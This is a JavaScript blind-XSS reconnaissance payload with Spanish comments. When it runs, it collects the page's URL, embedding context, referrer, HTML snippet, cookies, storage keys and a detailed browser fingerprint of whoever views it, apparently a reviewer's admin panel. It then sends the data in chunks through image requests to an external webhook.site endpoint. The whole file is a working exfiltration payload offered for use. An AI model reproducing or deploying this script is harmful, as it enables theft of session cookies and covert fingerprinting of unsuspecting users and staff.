(function() {
  'use strict';
  
  var WEBHOOK = 'https://webhook.site/1017fe30-0b47-473e-98b3-3badba9b4f69/recon';
  
  // Helper: intentar acceder a una propiedad sin romper el script si falla
  function safe(fn, fallback) {
    try { return fn(); } catch(e) { return fallback || ('err:' + e.message); }
  }
  
  // Detectar contexto de embedding (CRÍTICO para calibrar XSS)
  var isIframe = safe(function() { return window.self !== window.top; }, false);
  var parentUrl = safe(function() { return window.parent.location.href; }, 'cross-origin-blocked');
  var topUrl = safe(function() { return window.top.location.href; }, 'cross-origin-blocked');
  
  var ctx = {
    // === CONTEXTO DE EJECUCIÓN (lo más importante) ===
    href: safe(function() { return location.href; }),
    origin: safe(function() { return location.origin; }),
    protocol: safe(function() { return location.protocol; }),
    host: safe(function() { return location.host; }),
    pathname: safe(function() { return location.pathname; }),
    search: safe(function() { return location.search; }),
    
    // === EMBEDDING CONTEXT ===
    // Si isIframe=true y parentUrl=cross-origin-blocked => estamos en iframe cross-origin (señal de XSS real)
    is_iframe: isIframe,
    parent_url: parentUrl,
    top_url: topUrl,
    referrer: safe(function() { return document.referrer; }, 'no-referrer'),
    
    // === DOM INFO ===
    title: safe(function() { return document.title; }, 'no-title'),
    domain: safe(function() { return document.domain; }, 'no-domain'),
    ready_state: safe(function() { return document.readyState; }),
    
    // === HTML SNIPPET (para identificar qué panel es) ===
    html: safe(function() {
      return document.documentElement.outerHTML.substring(0, 3000);
    }, 'no-html'),
    
    // === COOKIES (vacío en file://, con valores si hay XSS real) ===
    cookies: safe(function() { return document.cookie; }, 'empty-or-blocked'),
    
    // === STORAGE (solo keys, no valores, para no exfiltrar info sensible innecesaria) ===
    ls_keys: safe(function() {
      return Object.keys(localStorage).join(',');
    }, 'ls-blocked'),
    ss_keys: safe(function() {
      return Object.keys(sessionStorage).join(',');
    }, 'ss-blocked'),
    
    // === FINGERPRINT DEL REVIEWER ===
    ua: safe(function() { return navigator.userAgent; }),
    platform: safe(function() { return navigator.platform; }),
    lang: safe(function() { return navigator.language; }),
    langs: safe(function() { return navigator.languages ? navigator.languages.join(',') : ''; }),
    tz: safe(function() { return Intl.DateTimeFormat().resolvedOptions().timeZone; }),
    screen: safe(function() { return screen.width + 'x' + screen.height; }),
    color_depth: safe(function() { return screen.colorDepth; }),
    vendor: safe(function() { return navigator.vendor; }),
    hw_concurrency: safe(function() { return navigator.hardwareConcurrency; }),
    
    // === TIMESTAMP ===
    ts: new Date().toISOString(),
    tz_offset: new Date().getTimezoneOffset()
  };
  
  // === EXFILTRACIÓN CON CHUNKING ===
  // Los webhooks truncan URLs largas, entonces partimos en chunks de 1500 chars
  var payload = encodeURIComponent(JSON.stringify(ctx));
  var CHUNK_SIZE = 1500;
  var total = Math.ceil(payload.length / CHUNK_SIZE);
  
  // Identificador único para esta ejecución (para correlacionar chunks)
  var runId = Math.random().toString(36).substring(2, 10);
  
  for (var i = 0; i < total; i++) {
    var chunk = payload.substring(i * CHUNK_SIZE, (i + 1) * CHUNK_SIZE);
    var img = new Image();
    img.src = WEBHOOK + '?rid=' + runId + '&i=' + i + '&n=' + total + '&d=' + chunk;
  }
  
  // === FALLBACK: si el chunking falla, al menos mandar un ping mínimo ===
  try {
    new Image().src = WEBHOOK + '/ping?rid=' + runId + 
      '&origin=' + encodeURIComponent(ctx.origin || 'none') +
      '&iframe=' + ctx.is_iframe +
      '&host=' + encodeURIComponent(ctx.host || 'none');
  } catch(e) {}
  
})();
